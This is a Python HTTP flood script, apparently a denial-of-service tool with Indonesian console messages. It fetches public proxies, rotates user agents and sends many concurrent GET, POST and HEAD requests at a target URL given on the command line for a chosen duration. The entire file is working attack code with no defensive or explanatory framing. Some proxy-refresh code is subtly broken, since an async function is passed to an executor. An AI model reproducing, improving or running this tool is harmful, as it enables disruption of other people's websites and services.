import asyncio
import aiohttp
import random
import time
import requests

PROXY_API = "https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=5000&country=all"
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X)...",
    "Mozilla/5.0 (X11; Linux x86_64)...",
]
METHODS = ["GET", "POST", "HEAD"]

def get_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://www.google.com",
        "Connection": "keep-alive",
    }

async def fetch_proxies():
    try:
        r = requests.get(PROXY_API, timeout=10)
        return ["http://" + l.strip() for l in r.text.splitlines() if ":" in l]
    except:
        return []

async def update_proxy_list(proxy_list, interval=60):
    while True:
        proxies = await asyncio.get_event_loop().run_in_executor(None, fetch_proxies)
        if proxies:
            proxy_list.clear()
            proxy_list.extend(proxies)
            print(f"[Proxy] Diperbarui: {len(proxies)} proxy aktif.")
        await asyncio.sleep(interval)

async def flood(session, target, proxy_list, duration, stats, tid):
    end = time.time() + duration
    while time.time() < end:
        proxy = random.choice(proxy_list)
        method = random.choice(METHODS)
        headers = get_headers()
        try:
            if method == "GET":
                async with session.get(target, proxy=proxy, headers=headers, timeout=7) as resp:
                    code = resp.status
            elif method == "POST":
                async with session.post(target, proxy=proxy, headers=headers, data={"rand": random.randint(1,10000)}, timeout=7) as resp:
                    code = resp.status
            else:
                async with session.head(target, proxy=proxy, headers=headers, timeout=7) as resp:
                    code = resp.status
            if code in [200, 301, 302, 403, 404]:
                stats["succ"] += 1
            else:
                stats["fail"] += 1
        except:
            stats["fail"] += 1

        await asyncio.sleep(0.05)

async def main():
    import sys
    if len(sys.argv) != 4:
        print("Usage: python3 flood_final.py <target_url> <duration_sec> <tasks>")
        return

    target = sys.argv[1]
    duration = int(sys.argv[2])
    tasks_count = int(sys.argv[3])

    proxy_list = await fetch_proxies()
    if not proxy_list:
        print("[!] Gagal ambil proxy. Keluar.")
        return

    print(f"[*] Target: {target}")
    print(f"[*] Durasi: {duration}s")
    print(f"[*] Tasks: {tasks_count}")
    print(f"[*] Proxy awal: {len(proxy_list)}")

    stats = {"succ": 0, "fail": 0}

    async with aiohttp.ClientSession() as session:
        tasks = []
        for i in range(tasks_count):
            tasks.append(flood(session, target, proxy_list, duration, stats, i))
        tasks.append(update_proxy_list(proxy_list))  # proxy auto update

        await asyncio.gather(*tasks)

    print("\n Statistik akhir:")
    print(f" Sukses: {stats['succ']}")
    print(f" Gagal : {stats['fail']}")
    print(f" Durasi: {duration}s")

if __name__ == "__main__":
    asyncio.run(main())
